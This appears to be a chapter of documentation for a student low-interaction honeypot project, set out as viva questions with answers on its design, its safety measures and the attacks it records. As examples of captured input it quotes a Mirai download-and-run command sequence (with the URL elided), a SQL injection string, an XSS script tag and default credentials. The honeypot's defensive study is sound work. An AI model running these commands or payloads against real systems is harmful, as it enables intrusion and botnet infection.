# 07 — Viva / Interview Questions

*28 questions with answers you can defend. The hard ones are marked ⚑.*

---

## A. Fundamentals

**1. What is a honeypot?**

A system with no legitimate purpose. Because nobody should ever connect to it, anything that does is unauthorised by definition. That gives it a property nothing else has: zero false positives. Every connection is a finding.

**2. Why zero false positives?** ⚑

An intrusion detection system watches a real server, where most traffic is legitimate, so it has to *decide* what's hostile — and that decision produces false positives. A honeypot has no legitimate traffic to hide in. There's no baseline of normal to model and no threshold to tune. If something connected, it had no reason to. That's structural, not a matter of tuning.

**3. Where does a honeypot fit among other defences?**

It doesn't defend anything — it listens. A firewall blocks, an IDS detects in real traffic, antivirus catches known files. A honeypot's unique job is gathering intelligence about the attacker — who, what, and how — with no noise. It's a source, often feeding a SIEM, not a control.

**4. Low-interaction versus high-interaction?** ⚑

Low-interaction emulates services just enough to record the attack — fast, safe, can't be compromised, but sees only the attacker's first move. High-interaction is a real OS the attacker genuinely breaks into — it captures the full attack including post-exploitation, but a compromised one is a real compromised machine that can attack third parties, and you're liable.

This project is low-interaction, deliberately. For the questions it answers — what credentials are botnets trying, what's being scanned — the first move is the whole answer, at essentially no risk.

**5. Why is high-interaction dangerous?**

Because a successful attack on it is a *real* successful attack. The box is now under attacker control and can launch attacks from your IP, for which you're legally responsible. Operating one safely needs a contained network, egress filtering and active monitoring. The risk is out of proportion to a study project, which is exactly why I chose low-interaction.

---

## B. Design and safety

**6. What's the one rule the whole design follows?** ⚑

Nothing an attacker sends is ever executed, parsed into code, written to a path they control, or passed to a shell. Every handler reads bytes, records them, and returns a canned response. There's no shell behind the telnet prompt, no filesystem behind FTP, no data store behind Redis. That rule is the line between a honeypot and a machine the attacker owns.

**7. Your telnet honeypot gives the attacker a shell. Isn't that dangerous?** ⚑

*(A trap question — the answer is that it's a fake shell.)*

It's a shell *prompt*, not a shell. After three login attempts it prints `BusyBox... #` and accepts commands — but every command hits a lookup table of canned replies. `whoami` returns `root`, `wget` returns a canned network error, and nothing is executed. The point is to capture the *commands* — the first one reveals the payload URL — while running none of them. `wget http://.../mirai.arm` is recorded and the binary is never fetched.

**8. How does the honeypot defend itself against SQL injection?** ⚑

Every database write is parameterised — bound placeholders, no string-formatted SQL anywhere. A honeypot processes hostile input for a living, so an f-string in a query would give it an injection hole, which would be an embarrassing way to be owned. There's a test that sends `'; DROP TABLE sessions; --` as a username and confirms the table survives and the value is stored as data.

**9. What's the worst way a honeypot could be compromised?** ⚑

Being turned against its own operator. The sharpest case is XSS: an attacker sends `<script>` as a username, and if the dashboard renders it unescaped, the payload runs in the operator's browser — you'd be owned by the tool built to catch attackers. The dashboard uses Jinja2 autoescaping specifically to stop that. More broadly, control characters and ANSI escapes are stripped before anything reaches a log or terminal, to stop log injection and terminal manipulation.

**10. What is log injection and how do you prevent it?**

An attacker embeds `\r\n` plus a forged timestamp in their input, so when it's logged it looks like a second, fake log line — which they can use to hide their real activity or frame someone. `_safe_text` escapes control characters and contains newlines before any input is logged, so attacker text can't forge a record boundary.

**11. What happens if a service crashes on malformed input?**

The connection is dropped and the server keeps running. Every `respond()` call is wrapped in a try/except that logs the exception and breaks that one connection's loop. An attacker's whole job is finding the input you didn't consider — so the design assumes they will, and makes the cost one dropped connection rather than a dead honeypot.

**12. Why does it bind to localhost by default?**

Because a honeypot on `0.0.0.0` is a service you've deliberately made attractive to attackers — a real decision with real consequences. Making that the default would mean someone exposes it by accident. `--bind 0.0.0.0` is opt-in and prints a warning, and there's a test asserting the default is `127.0.0.1`.

---

## C. Architecture

**13. Why asyncio and not threads?** ⚑

A honeypot spends nearly all its time waiting — for connections, for the next line, for timeouts. That's the textbook async case. Threads cost ~8 MB of stack each, so 5,000 concurrent connections would need ~40 GB — impossible. Coroutines cost a few KB each, so the same 5,000 fit in tens of MB.

It matters here specifically: a honeypot advertises itself to exactly the machines that send connection floods. A thread-per-connection design falls over the first time a botnet finds it. asyncio is a correctness requirement for this threat model, not an optimisation.

**14. How does one process handle seven ports?**

`asyncio.start_server` for each service, then one `asyncio.gather` over all their `serve_forever()` coroutines. Each incoming connection gets its own coroutine on the single event loop. No thread pool, no locks.

**15. How do you add a new service?**

Subclass `Service` and implement `greeting()` and `respond()` — typically about twenty lines. The server framework owns sockets, timeouts, byte limits, logging, scoring and storage, so a service owns only its protocol. That's why the Redis emulator is 30 lines.

**16. Explain your threat scoring.**

Each session gets 0–100. Connecting scores 10 because a honeypot has no users. Credential attempts add a little, recognised exploit paths add more, and payloads — a `wget` of a binary, a Redis SSH-key write — add most, because they're an actual attack in progress. It's a triage heuristic to sort the operator's attention, deliberately simple and readable rather than tuned. A machine-learning score would be more accurate and far less inspectable, and an operator needs to trust it at 3 a.m.

**17. Why SQLite, and why two tables?**

A honeypot's output is a queryable record — "top credentials by frequency" is a query, not a grep. SQLite gives real queries with no server to run. Two tables because "how many connections" and "how many login attempts" are different questions, and one connection carries many attempts; normalising them apart makes both a simple query.

---

## D. The services

**18. What's the single most valuable thing an SSH honeypot captures, and why?** ⚑

The client version string, because it arrives *before any password*. `libssh` and `paramiko` and `Go` clients are overwhelmingly botnets and scanners; `PuTTY` is a human. So we fingerprint the attacker's tooling before they've tried a single credential. A honeypot that captured only the SSH version string would still be worth running.

**19. How does the HTTP honeypot identify attacks?**

By the requested path — attackers probe specific paths for specific vulnerabilities. `/.env` is credential harvesting, `/actuator/env` is a Spring Boot misconfiguration, `/wp-login.php` is WordPress brute force, `busybox` in the path is an IoT worm. Fourteen signatures, each a real active campaign. The path is classified as a string and never used as a filesystem path.

**20. Walk me through a Mirai attack as your honeypot sees it.** ⚑

Telnet brute force with default credentials — `root/xc3511`, `admin/admin`. After three attempts we present a fake BusyBox shell. Then the playbook: `cat /proc/cpuinfo` to identify the CPU, `busybox MIRAI` to fingerprint the device, `wget http://.../mirai.arm` to fetch the payload, `chmod 777`, run it, `rm` the dropper. We record every step and execute none — the `wget` returns a canned network error and the attacker's script moves on. We learn the full intent and the payload URL without ever touching the binary.

**21. Can an attacker tell this is a honeypot?**

A determined human, yes — the SSH key exchange fails, the shell vocabulary is small, the banners are static. I don't hide that. Two things make it acceptable: almost all attacks are automated and don't check, and we capture the intelligence in the first interaction, before detection is possible. Making a honeypot undetectable to a careful human is an arms race Cowrie and commercial products invest heavily in and still don't fully win; a low-interaction honeypot optimises for the automated flood instead.

---

## E. Deployment and limits

**22. How do you catch attacks on port 22 without running as root?** ⚑

Run the honeypot unprivileged on a high port (8022) and redirect port 22 to it with an iptables NAT rule. The kernel does the redirect; the honeypot never runs as root. Running a network-facing service as root is exactly the mistake you don't want — if it's somehow exploited, an unprivileged process is a far better place to land.

**23. Where's the best place to deploy a honeypot?**

Internally. An external honeypot measures the internet's constant background scanning — interesting but noisy. An *internal* honeypot is a tripwire: nothing on your own network should ever connect to it, so if it lights up, something is already inside and looking around. It's the highest-value and least-appreciated placement, and the safest.

**24. What are the biggest limitations?**

Low-interaction means shallow — we see the first move and nothing after. The emulation is imperfect and a careful attacker can fingerprint it. And there's no threat-intel enrichment yet — source IPs aren't cross-referenced against reputation feeds. All three are stated in the README and expanded in the future-work doc.

**25. The demo data is simulated. Doesn't that undermine it?**

The *source* is simulated, nothing else. `simulate.py` opens real TCP connections that the honeypot really processes and really records — the byte sequences are the ones real Mirai and real scanners send. Only "who's connecting" is synthetic. Point the honeypot at a live network and nothing about it changes. Simulation is how you demonstrate a honeypot without exposing a port to the internet, which would be irresponsible for a coursework demo.

**26. Is this production-ready?**

As a low-interaction sensor on an internal network, close — it needs log rotation, the dashboard instead of the console, and ideally a SIEM feed. As a research honeypot facing the internet, it works but Cowrie is more capable and more battle-tested. I'd use this to *understand* honeypots and as an internal tripwire, and reach for Cowrie for serious external research.

**27. How would you make it more convincing?**

A real SSH key exchange (so the handshake completes), a much larger shell command vocabulary with believable filesystem state, per-request variation in the HTTP responses, and dynamic banners. Each closes a fingerprinting gap. It's an arms race with diminishing returns, which is why low-interaction honeypots pick a point on it and stop.

**28. What would you build next?**

Threat-intel enrichment first — cross-reference source IPs against AbuseIPDB and GreyNoise, which turns "someone tried root/root" into "a known Mirai node from this ASN tried root/root". Then a SIEM export, because the real value of honeypot data is correlating it with activity against your real servers. Both are in the future-work doc.

---

## Three things to have ready

**The core property:** a honeypot has no legitimate users, so every connection is an attack — zero false positives by construction. That's what makes it a clean intelligence source in a way an IDS can never be.

**The safety story:** the honeypot processes hostile input as its entire job, so it has to defend *itself* — parameterised SQL so an injection username can't drop the table, output escaping so an XSS username can't own the operator's browser, and a service crash that costs one connection, not the server. Ten of the twenty-four tests are safety tests, because a honeypot that can be turned against its operator is worse than none.

**The honest trade:** low-interaction means I see the attacker's first move and nothing after. That's a real limitation. I chose it because for the questions this answers — what are botnets trying right now — the first move is the whole answer, and it comes at essentially zero risk, whereas high-interaction is a real compromised machine you're liable for.

Volunteering that trade before being asked reads as understanding the field. Claiming the honeypot captures everything reads as not knowing what low-interaction means.

---

**Previous:** [06 — Setup & run](06-setup-and-run.md) | **Next:** [08 — Future work](08-future-work.md)
